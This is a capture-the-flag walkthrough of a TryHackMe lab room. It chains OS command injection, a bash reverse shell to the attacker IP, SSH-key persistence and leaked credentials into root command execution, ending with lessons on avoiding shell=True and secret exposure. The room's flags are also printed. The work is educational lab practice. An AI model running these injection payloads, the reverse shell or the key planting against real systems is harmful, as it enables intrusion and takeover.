# Infinity Pool (Patched) — TryHackMe Write-Up

## Overview

**Room:** Infinity Pool (Patched)
**Platform:** TryHackMe
**Target IP:** `10.67.181.120`
**Attacker IP:** `10.67.142.215`
**Initial Access:** OS Command Injection
**Privilege Escalation:** Internal service credential/token leaks + second OS Command Injection
**Final Privilege:** `root`

### Attack Chain

```text
Recon
  ↓
robots.txt
  ↓
/status
  ↓
/internal/netcheck
  ↓
OS Command Injection
  ↓
Reverse Shell as web
  ↓
User Flag
  ↓
Internal Service Enumeration
  ↓
Watchtower :3000
  ↓
FreePBX UCP Credentials
  ↓
SSH Port Forwarding :8080
  ↓
UCP Dashboard
  ↓
Automation Key leaked in Voicemail CID
  ↓
Automation Service :9000
  ↓
Second Command Injection
  ↓
Root
  ↓
Root Flag
```

---

# 1. Reconnaissance

I started by scanning the target with Nmap.

```bash
nmap -A -Pn 10.67.181.120 -oN nmap
```

### Output

```text
Starting Nmap 7.98

Nmap scan report for 10.67.181.120
Host is up.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http    Gunicorn

|_http-server-header: gunicorn
| http-robots.txt: 2 disallowed entries
|_/internal/ /status
|_http-title: Byte Lotus — Stay Noticed
```

Only two externally accessible TCP services were immediately visible:

* `22/tcp` — SSH
* `80/tcp` — HTTP/Gunicorn

The Nmap output also revealed two entries in `robots.txt`:

```text
/internal/
/status
```


---

# 2. Enumerating robots.txt

I requested the `robots.txt` file:

```bash
curl http://10.67.181.120/robots.txt
```

### Output

```text
User-agent: *
Disallow: /internal/
Disallow: /status
```

The `/internal/` directory returned a 404 when accessed directly, so I investigated `/status`.

```bash
curl http://10.67.181.120/status
```

The page exposed an internal **Sister-property connectivity** tool.



---

# 3. Discovering the Internal Endpoint

I also inspected the application's JavaScript:

```bash
curl -s http://10.67.181.120/static/app.js
```

A developer comment revealed the endpoint used by the `/status` tool:

```javascript
// Byte Lotus front-end bootstrap.
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
```

This gave me:

```text
POST /internal/netcheck
```

The `/status` page contained a form using a `host` parameter:

```html
<form method="post" action="/internal/netcheck" class="tool">
  <input type="text" name="host"
         placeholder="property host e.g. 10.0.0.5">
  <button type="submit">Check</button>
</form>
```


---

# 4. OS Command Injection

The application appeared to execute a ping command using the supplied `host`.

I tested whether shell metacharacters were interpreted:

```bash
curl -X POST http://10.67.181.120/internal/netcheck \
  -d 'host=;id'
```

### Output

```text
uid=1001(web) gid=1001(web) groups=1001(web)

ping: usage error: Destination address required
```

The command executed successfully as the `web` user.

I confirmed this with:

```bash
curl -X POST http://10.67.181.120/internal/netcheck \
  -d 'host=;whoami'
```

### Output

```text
web
```

I also confirmed Bash was available:

```bash
curl -X POST http://10.67.181.120/internal/netcheck \
  -d 'host=;which bash'
```

### Output

```text
/usr/bin/bash
```

This confirmed an **OS command injection vulnerability**.



---

# 5. Getting a Reverse Shell

My attacker machine was:

```text
10.67.142.215
```

I started a Netcat listener:

```bash
nc -lvnp 4444
```

### Output

```text
Listening on 0.0.0.0 4444
```

The first attempts using `curl -d` caused problems because special characters such as `&` were interpreted as form separators.

I therefore used `--data-urlencode` to properly encode the injected command:

```bash
curl -X POST http://10.67.181.120/internal/netcheck \
  --data-urlencode "host=;bash -c 'bash -i >& /dev/tcp/10.67.142.215/4444 0>&1'"
```

The HTTP request eventually timed out, which was expected because the injected command established a reverse shell instead of returning a normal HTTP response.

The listener received the connection:

```text
Connection received on 10.67.181.120 33870

bash: cannot set terminal process group (664):
Inappropriate ioctl for device

bash: no job control in this shell

web@tryhackme-2404:/var/www/infinity_pool/edge$
```

I now had a shell as:

```text
web
```



---

# 6. Capturing the User Flag

I checked the current user:

```bash
id
```

### Output

```text
uid=1001(web) gid=1001(web) groups=1001(web)
```

I then retrieved the user flag:

```bash
cat /home/web/user.txt
```

### Output

```text
THM{n0_v1s1bl3_3dg3}
```

### User Flag

```text
THM{n0_v1s1bl3_3dg3}
```

<img width="959" height="398" alt="image" src="https://github.com/user-attachments/assets/c6b23632-293e-4b5b-b63b-e92b8fa503ee" />

---

# 7. Enumerating Internal Services

With access to the machine, I checked listening services:

```bash
ss -tulnp
```

Several services were bound only to localhost.

Important TCP listeners included:

```text
127.0.0.1:9000
127.0.0.1:5038
127.0.0.1:3000
127.0.0.1:8080
127.0.0.1:8088
127.0.0.1:8089
127.0.0.1:3306
0.0.0.0:22
0.0.0.0:80
```

The most interesting services were:

```text
3000
9000
8080
```

I then inspected running processes:

```bash
ps auxww
```

Among the relevant processes were:

```text
root      ... /var/www/infinity_pool/automation/venv/bin/python3 \
               ... gunicorn --bind 127.0.0.1:9000 wsgi:app

web       ... /var/www/infinity_pool/edge/venv/bin/python3 \
               ... gunicorn --bind 0.0.0.0:80 wsgi:app

svc-watch ... /var/www/infinity_pool/watchtower/venv/bin/python3 \
               ... gunicorn --bind 127.0.0.1:3000 wsgi:app
```

This was particularly interesting because the automation service on port `9000` was running as **root**.

> **Screenshot placeholder:**
> `![Internal Services](images/07-internal-services.png)`

---

# 8. Watchtower Credential Leak

I queried the internal Watchtower service:

```bash
curl -s http://127.0.0.1:3000/api/config
```

### Output

```json
{
  "automation_endpoint":"http://127.0.0.1:9000",
  "note":"internal network only -- do not expose",
  "ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass":"St4yN0t1c3d_2026",
  "telephony_portal":"http://127.0.0.1:8080/ucp",
  "telephony_user":"FreePBXUCPTemplateCreator"
}
```

The internal service exposed valid FreePBX UCP credentials:

```text
Username:
FreePBXUCPTemplateCreator

Password:
St4yN0t1c3d_2026

Portal:
http://127.0.0.1:8080/ucp
```

The response even contained an internal warning that the credentials were still default credentials and needed to be rotated.

> **Screenshot placeholder:**
> `![Watchtower Credentials](images/08-watchtower-creds.png)`

---

# 9. Enumerating the Automation Service

I checked the automation service:

```bash
curl -s http://127.0.0.1:9000/health
```

### Output

```json
{
  "endpoints":{
    "GET /health":"service status",
    "POST /jobs/export":{
      "auth":"Authorization: Bearer <automation key>",
      "body":{
        "report":"<report name>"
      },
      "desc":"archive the latest data export"
    }
  },
  "runs_as":"root",
  "service":"automation",
  "status":"ok"
}
```

This was a major finding.

The service:

* Was accessible only on localhost.
* Required an Automation Key.
* Accepted a `report` parameter.
* Ran as `root`.

At this point, I needed to obtain the Automation Key.

---

# 10. SSH Port Forwarding

The UCP portal was only available on:

```text
127.0.0.1:8080
```

Instead of trying to reproduce the complete UCP login process with `curl`, I used SSH tunneling to access it through my browser.

First, I created an SSH key entry for the `web` account from the reverse shell.

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
touch ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

I added my attacker's public key:

```bash
printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILA5jA+G+lgCqj3SzxLV8PXV1oXcVNLodyBe7Pmt76tM' >> ~/.ssh/authorized_keys
```

I verified it:

```bash
tail -1 ~/.ssh/authorized_keys
```

### Output

```text
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILA5jA+G+lgCqj3SzxLV8PXV1oXcVNLodyBe7Pmt76tM
```

From my attacker machine, I connected using the private key:

```bash
ssh -i ~/.ssh/infinity_pool \
  -L 8080:127.0.0.1:8080 \
  web@10.67.181.120
```

The SSH connection succeeded:

```text
Welcome to Ubuntu 24.04.4 LTS

web@tryhackme-2404:~$
```

The important part of the command was:

```text
-L 8080:127.0.0.1:8080
```

This forwarded:

```text
Attacker:8080
      ↓
SSH tunnel
      ↓
Target:127.0.0.1:8080
```

I could therefore open the internal UCP portal in my browser using:

```text
http://127.0.0.1:8080/ucp/
```



---

# 11. Logging Into FreePBX UCP

Using the credentials obtained from Watchtower:

```text
Username:
FreePBXUCPTemplateCreator

Password:
St4yN0t1c3d_2026
```

I successfully authenticated to the UCP dashboard through the SSH tunnel.



---

# 12. Discovering the Automation Key

Inside the UCP dashboard, I added a dashboard tab and configured the **Voicemail** widget for the `FreePBXUCPTemplateCreator` mailbox.

A voicemail entry contained an unusual Caller ID:

```text
"Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
```

The value exposed the Automation Service Bearer token:

```text
cc_auto_7b3f9a1c4e0d2f6a
```

The extension `9000` was also consistent with the internal automation service running on port `9000`.

### Automation Key

```text
cc_auto_7b3f9a1c4e0d2f6a
```

<img width="455" height="175" alt="image" src="https://github.com/user-attachments/assets/0ccc6ba2-a76a-439e-a935-7c5e028e3860" />


---

# 13. Exploiting the Root Automation Service

The `/jobs/export` endpoint accepted a `report` parameter and was authenticated using the Automation Key.

I first tested command execution with `id`:

```bash
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"x.tgz /var/automation/data; id #"}'
```

### Output

```json
{
  "command":"tar czf /var/automation/exports/x.tgz /var/automation/data; id #.tgz /var/automation/data 2>&1",
  "output":"uid=0(root) gid=0(root) groups=0(root)\ntar: Removing leading `/' from member names\n"
}
```

The response confirmed:

```text
uid=0(root)
gid=0(root)
```

The command injection was therefore executing as **root**.



---

# 14. Retrieving the Root Flag

Since the command was executing as root, I used the same injection to read `/root/root.txt`.

```bash
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'
```

### Output

```text
THM{tr4c3d_t0_th3_h0r1z0n}
tar: Removing leading `/' from member names
```

### Root Flag

```text
THM{tr4c3d_t0_th3_h0r1z0n}
```

<img width="455" height="312" alt="image" src="https://github.com/user-attachments/assets/ee730503-d920-4ec6-875a-8dcb4e51a756" />


---

# 15. Complete Attack Chain

The complete exploitation path was:

```text
                         INTERNET
                            |
                            v
                  +-------------------+
                  | HTTP :80          |
                  | Gunicorn          |
                  +---------+---------+
                            |
                            v
                    /robots.txt
                            |
                            v
                  /status discovered
                            |
                            v
              /internal/netcheck
                            |
                            v
                  Command Injection
                            |
                            v
                     web user
                            |
                            v
                    Reverse Shell
                            |
                            v
                     user.txt
                            |
                            v
             Internal Service Enumeration
                            |
              +-------------+-------------+
              |                           |
              v                           v
       Watchtower :3000             Automation :9000
              |                           |
              v                           |
        /api/config                       |
              |                           |
              v                           |
       FreePBX UCP creds                  |
              |                           |
              v                           |
        SSH Port Forward                  |
              |                           |
              v                           |
        UCP Dashboard                     |
              |                           |
              v                           |
       Voicemail Widget                   |
              |                           |
              v                           |
       Automation Key --------------------+
                                          |
                                          v
                                /jobs/export
                                          |
                                          v
                                Command Injection
                                          |
                                          v
                                        ROOT
                                          |
                                          v
                                     root.txt
```

---

# 16. Vulnerabilities Identified

| # | Vulnerability              | Location                   | Impact                                 |
| - | -------------------------- | -------------------------- | -------------------------------------- |
| 1 | Information disclosure     | `/robots.txt` + JS comment | Revealed hidden internal functionality |
| 2 | OS command injection       | `/internal/netcheck`       | RCE as `web`                           |
| 3 | Credential disclosure      | Watchtower `/api/config`   | Exposed UCP credentials                |
| 4 | Sensitive token disclosure | UCP voicemail Caller ID    | Exposed Automation Key                 |
| 5 | OS command injection       | `/jobs/export`             | RCE as `root`                          |

---

# 17. Key Lessons Learned

### 1. `robots.txt` is not access control

The application attempted to hide internal functionality through:

```text
Disallow: /internal/
Disallow: /status
```

However, these entries actually helped reveal interesting attack surfaces.

Sensitive endpoints should be protected using proper authentication and authorization.

### 2. Avoid `shell=True`

The first vulnerable application effectively constructed a command similar to:

```python
subprocess.run(
    f"ping -c 1 {host}",
    shell=True
)
```

Because `host` was attacker-controlled, shell metacharacters could escape the intended command.

### 3. Internal services are still part of the attack surface

The Watchtower and automation services were bound to:

```text
127.0.0.1
```

They were not directly reachable externally, but once I obtained a shell, they became accessible.

### 4. Credentials should never be exposed through configuration APIs

Watchtower returned valid UCP credentials in plaintext, despite the service being marked as internal.

### 5. Secrets should never appear in user-facing fields

The Automation Key appeared inside a voicemail Caller ID field:

```text
"Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
```

This transformed a supposedly unrelated telephony feature into a credential-disclosure mechanism.

### 6. Root services dramatically increase the impact of RCE

The automation service explicitly ran as:

```text
root
```

Therefore, exploiting its command injection immediately resulted in root-level command execution.

---

# 18. Flags

### User Flag

```text
THM{n0_v1s1bl3_3dg3}
```

### Root Flag

```text
THM{tr4c3d_t0_th3_h0r1z0n}
```

---

# Conclusion

Infinity Pool was a great demonstration of how multiple seemingly small weaknesses can be chained into full system compromise.

The initial foothold came from an exposed internal endpoint discovered through `robots.txt` and a JavaScript developer comment. The endpoint contained an OS command injection vulnerability that provided a reverse shell as the `web` user.

From there, local enumeration revealed several internal services. Watchtower exposed default FreePBX UCP credentials, which I accessed through an SSH port-forwarded browser session. The UCP voicemail interface then exposed an Automation Key through a Caller ID field.

Finally, the Automation Key allowed access to a root-running export service containing another command injection vulnerability. Exploiting that vulnerability resulted in root command execution and recovery of the final flag.

The final attack chain was:

```text
Information Disclosure
        ↓
OS Command Injection
        ↓
Reverse Shell
        ↓
web
        ↓
Internal Service Enumeration
        ↓
Credential Leak
        ↓
SSH Tunneling
        ↓
UCP Access
        ↓
Automation Token Leak
        ↓
Root Command Injection
        ↓
root
```

**Flags captured:**

```text
USER: THM{n0_v1s1bl3_3dg3}
ROOT: THM{tr4c3d_t0_th3_h0r1z0n}
```

This room reinforced an important lesson for me: **a strong initial foothold is not always necessary when internal services, leaked credentials, and excessive privileges can be chained together.**
